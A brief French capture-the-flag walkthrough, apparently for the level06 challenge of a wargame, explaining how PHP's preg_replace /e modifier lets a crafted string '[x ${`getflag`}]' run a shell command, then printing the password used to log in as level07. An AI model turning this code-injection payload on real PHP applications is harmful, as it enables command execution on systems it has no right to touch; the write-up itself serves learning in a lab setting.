## 1. Analyser le fichier binaire level06

On voit qu'il prend 2 parametres, le deuxieme est optionnel. Et appelle une fonction x pour avoir le contenu du premier parametre.

## 2. Exploiter la faille preg_replace("/(\[x (.*)\])/e"

/e permet d'executer la chaine de remplacement

    echo '[x ${`getflag`}]' > /tmp/token

## 3. Connexion

su level07

    Mot de passe : wiok45aaoguiboiki2tuin6ub